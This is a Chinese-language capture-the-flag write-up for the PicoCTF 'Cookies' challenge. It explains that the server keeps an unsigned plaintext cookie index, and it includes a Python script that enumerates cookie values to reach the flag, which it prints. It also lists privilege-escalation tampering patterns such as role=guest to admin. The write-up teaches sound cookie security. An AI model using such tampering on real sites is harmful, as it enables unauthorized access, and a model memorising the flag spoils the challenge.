# CTF-10 Cookie 明文篡改

## 题目信息
- **平台**：PicoCTF
- **题目**：Cookies
- **类型**：Web / Cookie 篡改

## 题目描述
一个饼干搜索页面，输入饼干名搜索，看看服务器喜欢哪种饼干。

## 解题过程

### 1. 发现 cookie
打开 F12 → Application → Cookies，发现服务器设置了 cookie：

```
name=-1
```

**注意！** 这里存的不是 Flask 签名 session，而是**纯文本键值对**。

### 2. 分析规律
- 随便搜一个不存在的饼干名 → `name=-1`（无效）
- 搜 `snickerdoodle` → `name=0`（有效）
- 页面显示 "I love snickerdoodle cookies!"

说明：后端用**数字索引**来标记不同种类的饼干，存在 cookie 的 `name` 字段里。

### 3. 漏洞利用
因为 cookie 是明文，没有任何签名/加密，我们可以**手动篡改**。

写脚本遍历 `name=0` ~ `name=29`，每次 GET 请求都手动带上构造的 cookie：

```python
import requests
import re

url = 'http://wily-courier.picoctf.net:63375'

for i in range(30):
    cookies = {'name': str(i)}
    r = requests.get(url, cookies=cookies)
    
    if 'picoCTF{' in r.text:
        flag = re.search(r'picoCTF\{[^}]+\}', r.text)
        print(f'name={i}: {flag.group()}')
        break
    
    match = re.search(r'<b>I love (.*?) cookies!</b>', r.text)
    if match:
        print(f'name={i}: {match.group(1)}')
```

### 4. 拿到 Flag
```
name=18 → picoCTF{3v3ry1_l0v3s_c00k135_a4dadb49}
```

对应的是 "chocolate chip" 饼干。

## 知识点

### Cookie 的工作机制
1. 服务器通过 `Set-Cookie` 响应头告诉浏览器存什么值
2. 浏览器把 cookie 存**本地**
3. 每次请求同站点时，浏览器**自动**在请求头带上 `Cookie: xxx`

### 漏洞本质：不信任客户端数据
```
服务器用明文 cookie 存 name=索引
→ 攻击者可随意篡改
→ 服务器直接信任
→ 遍历所有索引，拿到 flag
```

### 安全编码教训
**不要在 cookie 里用明文存储敏感信息！** 正确的做法：

| 方案 | 说明 |
|------|------|
| **签名 cookie** | 如 Flask session，payload 有 HMAC 签名，篡改会失效 |
| **服务端 session** | cookie 只存随机 session ID，真实数据在服务器内存/数据库里 |

## 同类漏洞场景
- `role=guest` → 改成 `role=admin`
- `vip=0` → 改成 `vip=1`
- `user_id=123` → 改成 `user_id=0` 越权看别人数据

## 参考
- PicoCTF Cookies
- [OWASP - Cookie 安全](https://owasp.org/www-community/controls/SecureCookieAttribute)
